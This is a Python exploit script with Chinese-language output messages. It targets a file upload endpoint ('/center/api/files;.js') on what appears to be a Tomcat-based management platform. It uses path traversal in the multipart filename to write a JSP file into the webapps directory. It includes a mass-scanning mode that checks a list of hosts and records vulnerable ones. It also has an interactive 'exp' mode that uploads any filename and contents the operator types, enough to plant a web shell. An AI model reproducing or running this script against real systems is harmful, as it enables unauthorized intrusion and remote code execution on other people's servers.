import requests,argparse,sys,time
from multiprocessing import Pool


requests.packages.urllib3.disable_warnings()

def banner():
    test = """
    ██╗     ██╗   ██╗ █████╗ ███╗   ██╗███╗   ███╗ █████╗  ██████╗ ██████╗ ██████╗ ███████╗
   ██║     ██║   ██║██╔══██╗████╗  ██║████╗ ████║██╔══██╗██╔════╝██╔═══██╗██╔══██╗██╔════╝
  ██║     ██║   ██║███████║██╔██╗ ██║██╔████╔██║███████║██║     ██║   ██║██║  ██║█████╗  
 ██║     ██║   ██║██╔══██║██║╚██╗██║██║╚██╔╝██║██╔══██║██║     ██║   ██║██║  ██║██╔══╝  
███████╗╚██████╔╝██║  ██║██║ ╚████║██║ ╚═╝ ██║██║  ██║╚██████╗╚██████╔╝██████╔╝███████╗
╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝
                                                            author:luanma      
    """
    print(test)
def poc(target):
    url_payload = '/center/api/files;.js'
    url = target + url_payload
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 SE 2.X MetaSr 1.0",
        "Cache-Control": "no-cache",
        "Content-Type": "multipart/form-data; boundary=e0e1d419983f8f0e95c2d9ccf9b54e488353b5db7bac34b1a973ea9d0f0f",
        "Pragma": "no-cache",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "close"
    }
    data = "--e0e1d419983f8f0e95c2d9ccf9b54e488353b5db7bac34b1a973ea9d0f0f\r\nContent-Disposition: form-data; name=\"file\"; filename=\"../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/test.jsp\"\r\nContent-Type: application/octet-stream\r\n\r\n<%out.println(\"11223344\");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n--e0e1d419983f8f0e95c2d9ccf9b54e488353b5db7bac34b1a973ea9d0f0f--"
    #data = "--e54e7e5834c8c50e92189959fe7227a4\r\n\r\nContent-Disposition:form-data;name="file";filename="../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/2BT5AV96QW.txt"\r\n\r\nContent-Type: application/octet-stream\r\n\r\n123123\r\n\r\n--e54e7e5834c8c50e92189959fe7227a4--\r\n"
    try:
        response = requests.post(url=url, data=data, headers=headers, verify=False,timeout=5)
        result = target + '/clusterMgr/test.jsp;.js'
        if response.status_code == 200 and "filename" in response.text:
            print(f"[+]{target}存在文件上传漏洞!\n[+]{result}\n")
            with open('result.txt', 'a',encoding='utf-8') as f:
                f.write(target + "\n")
                return True
        else:
            print(f"[-]{target}不存在文件上传漏洞")
            return False
    except Exception as e:
        print(f"[-]{target}出毛病了")
        return False
def exp(target):
    print("================正在进行漏洞利用==================")
    time.sleep(2)

    while True:
        filename = input('请输入文件名:')
        code = input('请输入文件内容:')
        if filename == 'q' or code == 'quit':
            print('正在退出,请稍等...')
            break
        url_payload = '/center/api/files;.js'
        url = target + url_payload
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 SE 2.X MetaSr 1.0",
            "Cache-Control": "no-cache",
            "Content-Type": "multipart/form-data; boundary=e0e1d419983f8f0e95c2d9ccf9b54e488353b5db7bac34b1a973ea9d0f0f",
            "Pragma": "no-cache",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "close"
        }
        data = "--e0e1d419983f8f0e95c2d9ccf9b54e488353b5db7bac34b1a973ea9d0f0f\r\nContent-Disposition: form-data; name=\"file\"; filename=\"../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/" + f"{filename}" + "\"\r\nContent-Type: application/octet-stream\r\n\r\n" + f"{code}" + "\r\n--e0e1d419983f8f0e95c2d9ccf9b54e488353b5db7bac34b1a973ea9d0f0f--"
        try:
            response = requests.post(url=url, data=data, headers=headers, verify=False,timeout=5)
            result = target + f'/clusterMgr/{filename};.js'
            # print(result)
            if response.status_code == 200 and "filename" in response.text:
                print(f"[+]{target}存在文件上传漏洞!\n[+]{result}\n")
                with open('output.txt', 'a',encoding='utf-8') as f:
                    f.write(target + "\n")
                    return True
            else:
                print(f"[-]{target}不存在文件上传漏洞")
                return False
        except Exception as e:
            print(f"[-]{target}出错了")
def main():
    banner()
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url',dest='url',type=str,help="Please enter url")
    parser.add_argument('-f','--file',dest='file',type=str,help="Please enter file")
    args = parser.parse_args()
    url_list = []
    if args.url and not args.file:
        if poc(args.url):
            exp(args.file)
    elif args.file and not args.url:
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(10)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Please enter url or file")
if __name__ == '__main__':
    main()